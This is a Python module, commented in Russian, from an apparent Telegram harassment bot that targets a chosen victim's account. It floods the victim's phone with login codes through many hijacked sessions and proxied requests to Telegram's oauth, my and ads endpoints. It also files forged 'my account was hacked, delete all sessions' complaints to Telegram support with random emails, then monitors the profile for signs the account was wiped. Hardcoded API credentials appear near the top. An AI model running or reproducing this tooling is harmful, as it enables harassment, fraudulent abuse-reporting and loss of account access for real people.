# coding: utf-8
"""
Brown V2 | session_snos.py
Снос сессий жертвы.

Цикл:
1. Парсинг жертвы (username → ID, базовое состояние аватарки/описания)
2. Флуд кодами: SendCode через сессии sessions/ + oauth.telegram.org через прокси
3. Web support: 3 жалобы на telegram.org/support с ротацией текстов через прокси
4. Мониторинг: каждые 10 минут проверяем аватарку/описание, стоп при изменении
"""

import asyncio
import logging
import os
import random
import string

import aiohttp
from aiohttp_socks import ProxyConnector

from telethon import TelegramClient
from telethon.tl.functions.auth import SendCodeRequest
from telethon.errors import FloodWaitError, PhoneNumberInvalidError

import config
from config import bot_logs
from utils import now_msk, esc_md

logger = logging.getLogger(__name__)

MONITOR_INTERVAL = 10 * 60  # 10 минут

# API пары для telethon
API_PAIRS = [
    (24565698,  "5a084b434f8505ace703485b9da85040"),
    (27904162,  "e7cba879b1c643ba77490bf328df5eab"),
    (23037915,  "50f06f5b2223586fde0d1379ea91ebc7"),
    (29512095,  "0b29a7d42fff002856b9bed64f7ec919"),
    (25055016,  "25edf5b7becebe91a2d61fe8d9d9931b"),
]

# Сервисы для oauth флуда (bot_id, origin)
OAUTH_SERVICES = [
    ("5444323279",  "https://fragment.com"),
    ("5731754199",  "https://steam.kupikod.com"),
    ("210944655",   "https://combot.org"),
    ("319709511",   "https://telegrambot.biz"),
    ("1199558236",  "https://bot-t.com"),
    ("5709824482",  "https://lzt.market"),
    ("1803424014",  "https://ru.telegram-store.com"),
    ("5463728243",  "https://www.spot.uz"),
    ("6708902161",  "https://ourauthpoint777.com"),
    ("1852523856",  "https://cabinet.presscode.app"),
]

# Тексты для web support (ротация)
SUPPORT_TEXTS = [
    (
        "Здравствуйте, поддержка Telegram! Мой аккаунт был взломан путем фишинга, "
        "и моя активная сессия была сброшена. Сейчас на нем находится мошенник. "
        "Прошу вас помочь мне, обнулив все сессии на аккаунте, чтобы я смог "
        "восстановить доступ по SMS, либо удалить мой аккаунт. Спасибо!"
    ),
    (
        "Hello technical support, a stranger wrote to me today and asked me to change "
        "something in my account settings, pretending to be Telegram support. I changed "
        "what support asked me to do, and after a few minutes I was kicked out of my account "
        "and I can't get into it. My account has been hacked. Please delete the account "
        "or expel the scammer from the account in an alternative way."
    ),
    (
        "Здравствуйте! Хочу сообщить о проблеме с моим аккаунтом в телеграме. "
        "Мой аккаунт был взломан мошенниками через фишинг ссылку, после перехода "
        "меня выкинуло с моего аккаунта, а мошенники зашли туда. Я пытался войти "
        "в аккаунт по номеру и запросом кода в СМС, но мошенники поставили двухэтапную "
        "аутентификацию и привязали почту и блокируют мне вход в мой аккаунт. "
        "Я прошу вас удалить все сессии на моем аккаунте или полностью удалить мой аккаунт, "
        "потому что он украден мошенниками."
    ),
    (
        "Добрый день! Мой аккаунт Telegram был взломан. Я пытаюсь восстановить доступ "
        "уже несколько дней, но каждый раз при запросе сброса пароля приходит уведомление, "
        "что операция отменена. Это явно делает злоумышленник. Помогите, пожалуйста, "
        "решить эту проблему."
    ),
    (
        "Hello, I am writing to report that my Telegram account was stolen. "
        "I used this account for work, and without access to it I am unable to complete "
        "my tasks. This is putting my job at serious risk. "
        "I urgently request your immediate assistance in restoring access to my account "
        "or taking any necessary action to secure it. Please treat this as a priority issue."
    ),
    (
        "Здравствуйте, мой аккаунт был взломан и выставили на продажу на сайте. "
        "Теперь на мой аккаунт постоянно кто-то заходит и даже если я завершаю сессии "
        "то они всё равно заходят. Прошу принудительно завершить все сессии, "
        "кроме моей текущей, и восстановить контроль над аккаунтом."
    ),
]

SUPPORT_SUBJECTS = [
    "Взломан аккаунт",
    "Account hacked",
    "Stolen account",
    "Аккаунт украден",
    "Мошенники захватили аккаунт",
    "Hack report",
]

bot = None
main_bot = None


def set_bot_session(b):
    global bot, main_bot
    bot = b
    if main_bot is None:
        main_bot = b


# ─── Утилиты ──────────────────────────────────────────────────────────────────

def _rand_api():
    return random.choice(API_PAIRS)


def _get_sessions(folder="sessions") -> list[str]:
    if not os.path.exists(folder):
        return []
    return [
        os.path.join(folder, f.replace(".session", ""))
        for f in os.listdir(folder) if f.endswith(".session")
    ]


def _load_proxies() -> list[str]:
    """Читает proxies.txt формата host:port:user:pass или host:port."""
    proxies = []
    path = "proxies.txt"
    if not os.path.exists(path):
        return proxies
    with open(path, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                proxies.append(line)
    return proxies


def _proxy_url(raw: str) -> str:
    """Конвертирует host:port:user:pass → socks5://user:pass@host:port."""
    parts = raw.split(":")
    if len(parts) == 4:
        host, port, user, pwd = parts
        return f"socks5://{user}:{pwd}@{esc_md(host)}:{port}"
    elif len(parts) == 2:
        return f"socks5://{raw}"
    return raw


def _rand_name() -> str:
    first = ["Ivan", "Alexey", "Dmitry", "Sergey", "Mikhail",
             "Andrey", "Pavel", "Nikolay", "Anton", "Artem"]
    mid   = ["Ivanovich", "Alexandrovich", "Sergeevich", "Nikolaevich", ""]
    last  = ["Ivanov", "Petrov", "Sidorov", "Kuznetsov", "Sokolov",
             "Popov", "Lebedev", "Kozlov", "Novikov", "Morozov"]
    return f"{random.choice(first)} {random.choice(mid)} {random.choice(last)}".strip()


def _rand_email() -> str:
    names = ["ivan", "alex", "dmitry", "sergey", "mike", "andrey", "pavel"]
    domains = ["gmail.com", "yahoo.com", "outlook.com", "mail.ru", "protonmail.com"]
    n = random.choice(names) + str(random.randint(10, 9999))
    return f"{n}@{esc_md(random.choice(domains))}"


# ─── Шаг 1: парсинг жертвы ────────────────────────────────────────────────────

async def _parse_victim(username: str) -> dict:
    """Получает ID, наличие аватарки и описание через telethon."""
    sessions = _get_sessions()
    if not sessions:
        return {"ok": False, "error": "no_sessions"}

    session_path = random.choice(sessions)
    api_id, api_hash = _rand_api()

    try:
        client = TelegramClient(session_path, api_id, api_hash,
                                system_version="4.16.30-vxCUSTOM")
        await asyncio.wait_for(client.connect(), timeout=10)
        if not await client.is_user_authorized():
            await client.disconnect()
            return {"ok": False, "error": "session_invalid"}

        uname = username.lstrip("@")
        try:
            entity = await client.get_entity(uname)
        except Exception as e:
            await client.disconnect()
            return {"ok": False, "error": str(e)}

        has_photo = entity.photo is not None
        about = getattr(entity, "about", None) or ""
        uid = entity.id

        await client.disconnect()
        return {
            "ok": True,
            "id": uid,
            "username": uname,
            "has_photo": has_photo,
            "about": about,
        }
    except Exception as e:
        return {"ok": False, "error": str(e)}


# ─── Шаг 2: флуд SendCode через сессии ───────────────────────────────────────

async def _sendcode_one(session_path: str, phone: str) -> tuple[str, str]:
    """Отправляет SendCode от одной сессии. Возвращает (session_name, status)."""
    api_id, api_hash = _rand_api()
    name = os.path.basename(session_path)
    try:
        client = TelegramClient(session_path, api_id, api_hash,
                                system_version="4.16.30-vxCUSTOM")
        await asyncio.wait_for(client.connect(), timeout=8)
        if not await client.is_user_authorized():
            await client.disconnect()
            return name, "invalid"
        try:
            await client(SendCodeRequest(phone_number=phone, api_id=api_id, api_hash=api_hash, settings=None))  # type: ignore
            await client.disconnect()
            return name, "sent"
        except PhoneNumberInvalidError:
            await client.disconnect()
            return name, "invalid_phone"
        except FloodWaitError as e:
            await client.disconnect()
            return name, f"flood_{e.seconds}s"
        except Exception as e:
            await client.disconnect()
            return name, f"err_{str(e)[:30]}"
    except Exception as e:
        return name, f"conn_err_{str(e)[:20]}"


async def flood_sendcode(phone: str, progress_cb=None) -> dict:
    """Флудит SendCode на номер жертвы через все доступные сессии."""
    sessions = _get_sessions() + _get_sessions("prem_sessions")
    if not sessions:
        return {"sent": 0, "total": 0}

    random.shuffle(sessions)
    tasks = [_sendcode_one(s, phone) for s in sessions]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    sent = sum(1 for _, st in results if isinstance(st, str) and st == "sent")
    total = len(sessions)

    if progress_cb:
        await progress_cb(f"📲 SendCode флуд: {sent}/{total} отправлено")

    return {"sent": sent, "total": total}


# ─── Шаг 3: OAuth флуд через прокси ──────────────────────────────────────────

async def _oauth_one(session: aiohttp.ClientSession, phone: str,
                     bot_id: str, origin: str, proxy_url: str | None) -> tuple[str, bool]:
    """Один запрос на oauth.telegram.org/auth/request."""
    url = "https://oauth.telegram.org/auth/request"
    headers = {
        "Accept": "*/*",
        "Accept-Language": "ru-RU,ru;q=0.9,en;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://oauth.telegram.org",
        "Referer": "https://oauth.telegram.org/auth",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/126.0.0.0 Safari/537.36"
        ),
        "X-Requested-With": "XMLHttpRequest",
    }
    data = {
        "phone": phone,
        "bot_id": bot_id,
        "origin": origin,
        "request_access": "write",
        "return_to": origin,
    }
    service = origin.replace("https://", "").split("/")[0]
    try:
        kwargs: dict = {"headers": headers, "data": data, "timeout": aiohttp.ClientTimeout(total=10), "ssl": False}
        if proxy_url:
            kwargs["proxy"] = proxy_url
        async with session.post(url, **kwargs) as resp:
            ok = resp.status == 200
            return service, ok
    except Exception:
        return service, False


async def _mytg_one(session: aiohttp.ClientSession, phone: str, proxy_url: str | None) -> tuple[str, bool]:
    """Запрос на my.telegram.org/auth/send_password (шлёт код входа)."""
    url = "https://my.telegram.org/auth/send_password"
    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "ru-RU,ru;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://my.telegram.org",
        "Referer": "https://my.telegram.org/auth",
        "User-Agent": (
            "Mozilla/5.0 (Linux; Android 10; K) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/126.0.0.0 Mobile Safari/537.36"
        ),
        "X-Requested-With": "XMLHttpRequest",
    }
    data = {"phone": phone}
    try:
        kwargs: dict = {"headers": headers, "data": data, "timeout": aiohttp.ClientTimeout(total=10), "ssl": False}
        if proxy_url:
            kwargs["proxy"] = proxy_url
        async with session.post(url, **kwargs) as resp:
            ok = resp.status == 200
            return "my.telegram.org", ok
    except Exception:
        return "my.telegram.org", False


async def _ads_one(session: aiohttp.ClientSession, phone: str, proxy_url: str | None) -> tuple[str, bool]:
    """Запрос на ads.telegram.org/auth/ (шлёт код входа)."""
    url = "https://ads.telegram.org/auth/"
    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "ru-RU,ru;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://my.telegram.org",
        "Referer": "https://my.telegram.org/auth",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/126.0.0.0 Safari/537.36"
        ),
        "X-Requested-With": "XMLHttpRequest",
    }
    data = {"phone": phone}
    try:
        kwargs: dict = {"headers": headers, "data": data, "timeout": aiohttp.ClientTimeout(total=10), "ssl": False}
        if proxy_url:
            kwargs["proxy"] = proxy_url
        async with session.post(url, **kwargs) as resp:
            ok = resp.status == 200
            return "ads.telegram.org", ok
    except Exception:
        return "ads.telegram.org", False


async def flood_oauth(phone: str, proxies: list[str], progress_cb=None) -> dict:
    """Флудит коды через oauth.telegram.org + my.telegram.org + ads.telegram.org."""
    results = []

    async with aiohttp.ClientSession() as session:
        tasks = []
        for bot_id, origin in OAUTH_SERVICES:
            proxy_url = _proxy_url(random.choice(proxies)) if proxies else None
            tasks.append(_oauth_one(session, phone, bot_id, origin, proxy_url))

        # my.telegram.org и ads
        for _ in range(3):
            proxy_url = _proxy_url(random.choice(proxies)) if proxies else None
            tasks.append(_mytg_one(session, phone, proxy_url))
            tasks.append(_ads_one(session, phone, proxy_url))

        results = await asyncio.gather(*tasks, return_exceptions=True)

    sent = sum(1 for _, ok in results if isinstance(ok, bool) and ok)
    total = len(results)

    if progress_cb:
        await progress_cb(f"🌐 OAuth флуд: {sent}/{total} запросов прошло")

    return {"sent": sent, "total": total}


# ─── Шаг 4: web support ───────────────────────────────────────────────────────

async def _support_one(session: aiohttp.ClientSession,
                       phone: str, text: str, subject: str,
                       proxy_url: str | None) -> bool:
    """Одна жалоба на telegram.org/support."""
    url = "https://telegram.org/support?setln=ru"
    payload = {
        "subject": subject,
        "message": text,
        "email": _rand_email(),
        "phone": phone,
    }
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/126.0.0.0 Safari/537.36"
        ),
        "Referer": "https://telegram.org/support",
        "Origin": "https://telegram.org",
    }
    try:
        kwargs: dict = {"data": payload, "headers": headers,
                        "timeout": aiohttp.ClientTimeout(total=15), "ssl": False}
        if proxy_url:
            kwargs["proxy"] = proxy_url
        async with session.post(url, **kwargs) as resp:
            return resp.status == 200
    except Exception:
        return False


async def send_web_support(phone: str, username: str, victim_id: int,
                           proxies: list[str], progress_cb=None) -> dict:
    """Отправляет 3 жалобы на telegram.org/support с разными текстами."""
    texts = random.sample(SUPPORT_TEXTS, min(3, len(SUPPORT_TEXTS)))
    sent = 0

    async with aiohttp.ClientSession() as session:
        for i, text in enumerate(texts, 1):
            # Вставляем данные жертвы в текст
            full_text = (
                f"{text}\n\n"
                f"Данные аккаунта:\n"
                f"Номер телефона: {phone}\n"
                f"ID аккаунта: {victim_id}\n"
                f"Username: *@{username}*"
            )
            subject = random.choice(SUPPORT_SUBJECTS)
            proxy_url = _proxy_url(random.choice(proxies)) if proxies else None

            ok = await _support_one(session, phone, full_text, subject, proxy_url)
            if ok:
                sent += 1

            if progress_cb:
                icon = "✅" if ok else "❌"
                await progress_cb(f"📨 Web support #{i}: {icon}")

            await asyncio.sleep(random.uniform(1.5, 3.5))

    return {"sent": sent, "total": len(texts)}


# ─── Шаг 5: мониторинг ────────────────────────────────────────────────────────

async def _get_victim_state(username: str, sessions: list[str]) -> dict | None:
    """Получает текущее состояние аккаунта жертвы."""
    if not sessions:
        return None
    session_path = random.choice(sessions)
    api_id, api_hash = _rand_api()
    try:
        client = TelegramClient(session_path, api_id, api_hash,
                                system_version="4.16.30-vxCUSTOM")
        await asyncio.wait_for(client.connect(), timeout=8)
        if not await client.is_user_authorized():
            await client.disconnect()
            return None
        try:
            entity = await client.get_entity(username)
            state = {
                "has_photo": entity.photo is not None,
                "about": getattr(entity, "about", None) or "",
                "deleted": getattr(entity, "deleted", False),
            }
            await client.disconnect()
            return state
        except Exception:
            await client.disconnect()
            return None
    except Exception:
        return None


async def monitor_session_loop(username: str, victim_id: int,
                                baseline: dict,
                                user_id: int, requester_username: str):
    """
    Мониторинг каждые 10 минут.
    Сравниваем с baseline (has_photo, about).
    При изменении — уведомляем юзера и в канал, стопаемся.
    """
    sessions = _get_sessions() + _get_sessions("prem_sessions")
    check_num = 0

    while True:
        await asyncio.sleep(MONITOR_INTERVAL)
        check_num += 1

        state = await _get_victim_state(username, sessions)
        if state is None:
            continue

        changes = []

        if state["deleted"]:
            changes.append("🗑 Аккаунт удалён")

        if baseline["has_photo"] and not state["has_photo"]:
            changes.append("🖼 Аватарка исчезла")

        if baseline["about"] and not state["about"]:
            changes.append("📝 Описание пропало")

        if changes:
            ts = now_msk().strftime("%d.%m.%Y %H:%M:%S")
            change_text = "\n".join(f"  └ {c}" for c in changes)

            user_msg = (
                f"🔔 *Мониторинг сессий — изменение*\n\n"
                f"🎯 Цель: *@{username}* ({victim_id})\n"
                f"{change_text}\n\n"
                f"⏰ {ts}\n"
                f"✅ *Вероятно сессии снесены!*"
            )
            try:
                import db as _db_mod
                _is_hid = await _db_mod.get_is_hidden(user_id)
                _log_uid = "скрыт" if _is_hid else str(user_id)
                _log_uname = "скрыт" if _is_hid else requester_username
            except Exception:
                _log_uid, _log_uname = str(user_id), requester_username

            log_msg = (
                f"🔔 *Session Monitor*\n"
                f"🎯 *@{username}* | {victim_id}\n"
                f"{change_text}\n"
                f"👤 {_log_uid} (*@{_log_uname}*)\n"
                f"⏰ {ts}"
            )

            try:
                await _notify.send_message(user_id, user_msg, parse_mode="Markdown")
                await main_bot.send_message(bot_logs, log_msg, parse_mode="Markdown")
            except Exception as e:
                logger.error(f"[SESSION_MONITOR] Ошибка отправки: {e}")

            return  # стоп — изменение поймано


# ─── Главная точка входа ──────────────────────────────────────────────────────

async def main_session_snos(user_id: int, username: str,
                             victim_username: str, victim_phone: str, notify_bot=None):
    """
    Полный цикл сноса сессий.
    victim_username — username жертвы (без @)
    victim_phone    — номер телефона жертвы (например +79991234567)
    """
    import keyboards

    ts = now_msk().strftime("%d.%m.%Y %H:%M:%S")
    proxies = _load_proxies()

    async def progress(text: str):
        try:
            await _notify.send_message(user_id, text, parse_mode="Markdown")
        except Exception:
            pass

    # ── 1. Парсим жертву ──────────────────────────────────────────────────────
    await _notify.send_message(user_id,
        f"🔍 *Снос сессий* — старт\n"
        f"*└─ Парсинг *@{victim_username}*...*",
        parse_mode="Markdown")

    victim = await _parse_victim(victim_username)
    if not victim["ok"]:
        await _notify.send_message(user_id,
            f"❌ *Не удалось найти жертву:* {victim.get('error', 'unknown')}",
            parse_mode="Markdown",
            reply_markup=keyboards.main_menu)
        return

    victim_id = victim["id"]
    baseline = {"has_photo": victim["has_photo"], "about": victim["about"]}

    await _notify.send_message(user_id,
        f"✅ *Жертва найдена*\n"
        f"*└─ ID:* {victim_id}\n"
        f"*└─ Аватарка:* {'есть' if baseline['has_photo'] else 'нет'}\n"
        f"*└─ Описание:* {'есть' if baseline['about'] else 'нет'}\n\n"
        f"🚀 *Запускаю атаку...*",
        parse_mode="Markdown")

    # ── 2. Флуд SendCode через сессии ─────────────────────────────────────────
    sc = await flood_sendcode(victim_phone, progress_cb=progress)

    # ── 3. OAuth флуд через прокси ────────────────────────────────────────────
    oa = await flood_oauth(victim_phone, proxies, progress_cb=progress)

    # ── 4. Web support ────────────────────────────────────────────────────────
    ws = await send_web_support(victim_phone, victim_username, victim_id,
                                 proxies, progress_cb=progress)

    # ── 5. Итог ───────────────────────────────────────────────────────────────
    summary_user = (
        f"📊 *Снос сессий — итог*\n\n"
        f"🎯 *Цель:* *@{victim_username}* ({victim_id})\n"
        f"📱 *Номер:* {victim_phone}\n\n"
        f"📲 *SendCode флуд:* {sc['sent']}/{sc['total']} сессий\n"
        f"🌐 *OAuth флуд:* {oa['sent']}/{oa['total']} запросов\n"
        f"📨 *Web support:* {ws['sent']}/{ws['total']} жалоб\n\n"
        f"🔍 *Мониторинг запущен* — каждые 10 мин\n"
        f"*└─ Уведомлю при изменении аватарки/описания*\n\n"
        f"⏰ {ts}"
    )
    summary_log = (
        f"💀 *Session Snos*\n"
        f"🎯 *@{victim_username}* | {victim_id}\n"
        f"📱 {victim_phone}\n"
        f"📲 SC: {sc['sent']}/{sc['total']} | "
        f"🌐 OAuth: {oa['sent']}/{oa['total']} | "
        f"📨 Web: {ws['sent']}/{ws['total']}\n"
        f"👤 {user_id} (*@{username}*)\n"
        f"⏰ {ts}"
    )

    await _notify.send_message(user_id, summary_user,
        parse_mode="Markdown", reply_markup=keyboards.main_menu)
    await main_bot.send_message(bot_logs, summary_log, parse_mode="Markdown")

    # ── 6. Мониторинг в фоне ──────────────────────────────────────────────────
    asyncio.create_task(monitor_session_loop(
        victim_username, victim_id, baseline,
        user_id, username
    ))
